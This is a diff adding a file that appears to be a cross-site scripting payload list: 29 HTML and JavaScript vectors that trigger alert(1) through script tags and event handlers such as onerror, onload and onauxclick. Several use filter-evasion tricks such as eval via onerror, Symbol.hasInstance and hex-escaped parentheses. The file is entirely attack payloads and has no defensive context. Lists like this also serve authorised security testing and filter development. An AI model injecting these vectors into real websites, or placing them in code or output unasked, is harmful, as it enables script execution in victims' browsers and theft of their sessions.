@@ -1,0 +1,29 @@
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
+<script>location='javascript:alert\x281\x29'</script>
+<script>location=alert(1)</script>
+<script>alert`1`</script>
+<script>throw[onerror]=[alert],1</script>
+<script>var{a:onerror}={a:alert};throw 1</script>
+<script>var{haha:onerror=alert}=0;throw 1</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<img src=x onerror=alert(1)>
+<embed src=/ onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<style onload=alert(1)></style>
+<svg onload=alert(1)>
+<body onafterprint=alert(1)>
+<input onauxclick=alert(1)>
+<textarea onauxclick=alert(1)>XSS</textarea>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<input onchange=alert(1) value=xss>
+<plaintext onclick="alert(1)">test</plaintext>
+<a oncontextmenu="alert(1)">test</a>
+<body onwheel=alert(1)>
